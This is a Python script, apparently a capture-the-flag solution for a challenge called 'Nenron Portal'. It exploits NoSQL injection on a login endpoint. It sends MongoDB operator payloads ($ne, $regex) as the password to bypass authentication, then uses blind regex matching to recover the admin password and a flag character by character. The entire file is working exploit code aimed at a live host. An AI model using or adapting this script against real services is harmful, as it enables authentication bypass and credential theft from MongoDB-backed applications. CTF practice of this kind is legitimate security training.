#!/usr/bin/env python3
"""
Extract the admin password using NoSQL injection
"""

import requests
import json
import string

def check_password_char(position, char):
    """Check if a specific character at a position matches"""
    url = "http://chals.uscc-cyberbowl-2025.ctf.institute:3006/login"
    
    # Using regex to check character at position
    payload = {
        "username": "admin",
        "password": {"$regex": f"^.{{{position}}}{char}.*"}
    }
    
    try:
        response = requests.post(url, json=payload, headers={'Content-Type': 'application/json'})
        return response.status_code == 200
    except:
        return False

def extract_password_length():
    """Find the length of the password"""
    url = "http://chals.uscc-cyberbowl-2025.ctf.institute:3006/login"
    
    for length in range(1, 100):
        # Check if password has exactly this length
        payload = {
            "username": "admin",
            "password": {"$regex": f"^.{{{length}}}$"}
        }
        
        try:
            response = requests.post(url, json=payload, headers={'Content-Type': 'application/json'})
            if response.status_code == 200:
                return length
        except:
            pass
    
    return None

def extract_password():
    """Extract the admin password character by character"""
    print("[*] Extracting admin password using NoSQL injection...")
    
    # First, find the password length
    print("[*] Finding password length...")
    length = extract_password_length()
    if length:
        print(f"[+] Password length: {length}")
    else:
        print("[-] Could not determine password length")
        return None
    
    # Character set to test (include special chars for passwords/flags)
    charset = string.ascii_letters + string.digits + "_{}-!@#$%^&*()+=[]{}|;:,.<>?/"
    
    password = ""
    
    print("[*] Extracting password character by character...")
    for position in range(length):
        found = False
        for char in charset:
            if check_password_char(position, char):
                password += char
                print(f"[+] Position {position}: {char} (Current: {password})")
                found = True
                break
        
        if not found:
            print(f"[-] Could not find character at position {position}")
            # Try with escaped special characters
            for char in ['\\', '"', "'", '`']:
                if check_password_char(position, '\\' + char):
                    password += char
                    print(f"[+] Position {position}: {char} (escaped) (Current: {password})")
                    found = True
                    break
            
            if not found:
                password += "?"
                print(f"[-] Unknown character at position {position}")
    
    return password

def test_extracted_password(password):
    """Test if the extracted password works"""
    url = "http://chals.uscc-cyberbowl-2025.ctf.institute:3006/login"
    
    payload = {
        "username": "admin",
        "password": password
    }
    
    try:
        response = requests.post(url, json=payload, headers={'Content-Type': 'application/json'})
        print(f"\n[*] Testing extracted password: {password}")
        print(f"[*] Status: {response.status_code}")
        print(f"[*] Response: {response.text}")
        return response.status_code == 200
    except Exception as e:
        print(f"[-] Error testing password: {e}")
        return False

def try_alternative_extraction():
    """Try alternative methods to extract password"""
    url = "http://chals.uscc-cyberbowl-2025.ctf.institute:3006/login"
    
    print("\n[*] Trying alternative extraction methods...")
    
    # Method 1: Check if password contains flag format
    flag_patterns = ["USCC{", "uscc{", "CTF{", "flag{", "FLAG{"]
    
    for pattern in flag_patterns:
        payload = {
            "username": "admin",
            "password": {"$regex": f".*{pattern}.*"}
        }
        
        try:
            response = requests.post(url, json=payload)
            if response.status_code == 200:
                print(f"[+] Password contains pattern: {pattern}")
                
                # Extract the flag
                if pattern.lower().endswith("{"):
                    flag = pattern
                    position = len(pattern)
                    
                    # Get characters until we hit }
                    while True:
                        found = False
                        for char in string.ascii_letters + string.digits + "_-":
                            test_flag = flag + char
                            payload = {
                                "username": "admin",
                                "password": {"$regex": f".*{test_flag}.*"}
                            }
                            
                            response = requests.post(url, json=payload)
                            if response.status_code == 200:
                                flag = test_flag
                                print(f"[+] Building flag: {flag}")
                                found = True
                                break
                        
                        if not found:
                            # Check if it ends with }
                            test_flag = flag + "}"
                            payload = {
                                "username": "admin",
                                "password": {"$regex": f".*{test_flag}.*"}
                            }
                            
                            response = requests.post(url, json=payload)
                            if response.status_code == 200:
                                flag = test_flag
                                print(f"[+] Complete flag found: {flag}")
                                return flag
                            break
                        
                        if len(flag) > 100:  # Safety check
                            break
                            
        except Exception as e:
            print(f"[-] Error with pattern {pattern}: {e}")

def main():
    print("[*] Nenron Portal Password Extractor\n")
    
    # First, verify NoSQL injection still works
    url = "http://chals.uscc-cyberbowl-2025.ctf.institute:3006/login"
    payload = {"username": "admin", "password": {"$ne": None}}
    
    response = requests.post(url, json=payload)
    if response.status_code != 200:
        print("[-] NoSQL injection no longer works!")
        return
    
    print("[+] NoSQL injection confirmed working\n")
    
    # Try to extract the password
    password = extract_password()
    
    if password:
        print(f"\n[+] Extracted password: {password}")
        
        # Test if it's the actual password
        if test_extracted_password(password):
            print("[+] Password confirmed working!")
        else:
            print("[-] Extracted password doesn't work directly")
    
    # Try alternative methods
    alt_password = try_alternative_extraction()
    if alt_password:
        print(f"\n[+] Alternative extraction found: {alt_password}")

if __name__ == "__main__":
    main()